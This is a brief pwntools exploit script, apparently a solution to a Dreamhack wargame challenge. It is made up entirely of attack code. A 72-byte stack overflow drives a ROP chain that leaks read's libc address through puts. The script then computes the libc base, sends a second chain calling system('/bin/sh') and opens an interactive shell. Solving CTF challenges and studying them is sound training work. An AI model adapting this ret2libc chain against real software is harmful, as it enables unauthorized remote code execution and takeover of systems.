from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8311
r = remote(HOST, PORT)

main = 0x4007ba
pop_rdi = 0x400883
puts_plt = 0x4005c0
read_got = 0x601030

r.sendline(b'A' * 72 + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main))

libc_read = u64(r.recvline().strip(b'A').strip().ljust(8, b'\x00'))
libc = libc_read - 0x114980
pop_rdi = libc+0x2a3e5
pop_rsi = libc+0x2be51
system = libc+0x50d60
binsh = libc+0x1d8698
ret = libc+0x29cd6

payload = b'A' * 72 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(system)
r.sendline(payload)

r.interactive() 